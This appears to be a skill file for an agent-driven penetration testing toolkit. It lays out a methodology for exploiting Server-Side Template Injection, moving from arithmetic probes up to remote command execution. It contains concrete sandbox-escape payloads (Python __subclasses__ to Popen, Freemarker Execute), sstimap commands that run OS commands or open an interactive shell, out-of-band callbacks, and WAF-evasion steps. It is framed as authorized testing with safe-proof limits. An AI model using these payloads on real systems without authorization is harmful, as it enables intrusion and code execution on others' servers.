---
name: attack-ssti
description: Server-Side Template Injection — inject template syntax that the engine evaluates, escalating to code eval / RCE.
category: web-application
tags: [ssti, injection, template, rce, code-eval]
cwe_ids: [CWE-1336, CWE-94]
chains_with: [oob-interactsh, attack-xss]
tools: [sstimap, arjun, interactsh-client, wafrift, curl]
version: "1.1"
---

# SSTI

## Objective
Prove input is evaluated by a server-side template engine — first as arithmetic/expression eval, then
escalated to command execution. The proof for RCE is command output (`id`/`whoami`/`hostname` only,
per policy), not a rendered `49`. Runs go through the leash: `tools/leashed.sh $T bin/<tool> …`.

## Methodology
1. **Find & expand sinks.** Any input rendered back through a template: names, search, error messages,
   filenames, email/notification previews, `subject`/`greeting` fields. Surface hidden params with
   `bin/arjun -u "$U" -oJ raw/ssti/params.json`.
2. **Detect the engine.** Point sstimap at each param — it fingerprints Jinja2/Twig/Freemarker/ERB/
   Velocity/etc. via polyglot probes:
   `tools/leashed.sh $T bin/sstimap -u "$U?name=*" --engine-check`. A math payload (`{{7*7}}`→`49`,
   `${7*7}`, `<%= 7*7 %>`) returning the product confirms evaluation as the baseline.
3. **Escalate to eval/RCE.** Where the engine allows it, drive execution through sstimap:
   `tools/leashed.sh $T bin/sstimap -u "$U?name=*" --os-cmd 'id'` (single command) or `-S` for an
   interactive OS shell; `--eval-shell` for language-level eval. Capture the returned `id` output.
4. **Blind SSTI.** No reflected result → prove evaluation out-of-band: inject a payload that makes the
   engine fetch/resolve a controlled host (`bin/interactsh-client -json -o raw/ssti/oob.jsonl`, see
   `oob-interactsh`); a callback from a template-driven request confirms server-side evaluation.
5. **Sandbox escape.** If direct RCE is blocked, walk the object/class chain the engine exposes
   (Python `__class__`/`__subclasses__`, Java runtime) via sstimap to reach a command sink.

## Escalation ladder — `{{7*7}}`=49 is rung 1, not the finding
Arithmetic eval proves injection; a senior does NOT stop there. Climb to command execution and mint the
foothold — the SSTI class's real impact is RCE:
1. **Eval** (baseline) — `{{7*7}}`→`49` / `${7*7}` / `<%= 7*7 %>` confirms server-side evaluation.
2. **Read** — engine-native file/attribute read (Jinja `{{config}}`/`{{self.__init__.__globals__}}`,
   Freemarker `?api`, Velocity tool access) to prove info exposure before going for exec.
3. **Sandbox escape** — walk the object/class chain: Python `''.__class__.__mro__[1].__subclasses__()` →
   `Popen`/`os.system`; Java runtime via Freemarker `Execute`/`ObjectConstructor`; `sstimap --eval-shell`.
4. **Command exec** — `tools/leashed.sh $T bin/sstimap -u "$U?name=*" --os-cmd 'id'`; capture the `id`
   output (safe-PoC only). This mints `shell:<host>` + `foothold:<host>` → post-foothold stage fires next wave.
5. **Blind** — no reflected result: prove exec out-of-band (interactsh callback from a template-driven fetch).
Stop at `whoami`/`id`; never a persistent shell or destructive command. If exec is sandboxed beyond escape
and no OOB path exists, the proven eval/read rung is still a High finding. WAF blocking the polyglot? Mutate
it through `bin/wafrift` (grammar=ssti) and retry.

## What counts as a finding
- **Critical:** command execution proven — `id`/`whoami`/`hostname` output returned. RCE is the class.
- **High:** confirmed server-side eval (arithmetic reduced, or a blind OOB callback) with no command
  path reached yet.
- **Lead only:** the marker reflects unevaluated (`{{7*7}}` stays literal) — a
  `[UNCONFIRMED CANDIDATE]`, never an SSTI finding (see `poc-standard`).

## Evidence
Under `raw/ssti/`: the injecting request, the evaluated response (the product, or the `id` command
output), the sstimap session log / detected engine, any interactsh callback line, and a runnable PoC.
Stay within safe-PoC command limits. All target-facing HTTP goes through `tools/leashed.sh`.
